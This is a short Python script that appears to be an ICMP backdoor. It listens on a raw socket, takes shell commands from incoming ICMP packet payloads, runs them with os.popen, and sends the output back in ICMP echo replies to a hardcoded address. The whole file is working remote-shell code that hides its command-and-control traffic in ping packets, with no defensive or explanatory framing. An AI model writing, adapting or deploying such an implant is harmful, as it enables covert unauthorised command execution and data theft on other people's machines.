#!/usr/bin/python
import socket
import struct
import os
def do_checksum(source_string):
    """  Verify the packet integritity """
    sum = 0
    max_count = (len(source_string)/2)*2
    count = 0
    while count < max_count:
        val = ord(source_string[count + 1])*256 + ord(source_string[count])
        sum = sum + val
        sum = sum & 0xffffffff
        count = count + 2

    if max_count<len(source_string):
        sum = sum + ord(source_string[len(source_string) - 1])
        sum = sum & 0xffffffff
    sum = (sum >> 16)  +  (sum & 0xffff)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer



def icmp_recv(sock):


        recv_data,addr = sock.recvfrom(2500)
        icmp_header = recv_data[20:28]
        type, code, checksum, packet_ID, sequence = struct.unpack(
                "bbHHh", icmp_header
            )

        cmd, = struct.unpack('2000s',recv_data[28:])

        ip = recv_data[0:20]
        ip_header = struct.unpack('!BBHHHBBH4s4s',ip)


        s_addr = socket.inet_ntoa(ip_header[8])
        d_addr = socket.inet_ntoa(ip_header[9])


        '''
        print(ip_header)
        print(s_addr)
        print(d_addr)
        print(data)
        print(type)
        print(code)
        print(checksum)
        print(packet_ID)
        print(sequence)
        '''

        return cmd



if __name__ =='__main__':
    sock = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.getprotobyname('icmp'))
    while True:

        cmd = icmp_recv(sock)
        cmd =icmp_recv(sock)
        cmd = cmd.strip('\0')
        print(len(cmd))
        cmd_result = os.popen(cmd).read()
        my_checksum = 0
        header = struct.pack("bbHHh",0,0,my_checksum,0,0)
        data = struct.pack('2000s',cmd_result)
        my_checksum = do_checksum(header + data)
        header = struct.pack("bbHHh", 0, 0, my_checksum,0,0)
        packet = header + data

        sock.sendto(packet,('192.168.0.108', 1))
        print('send')


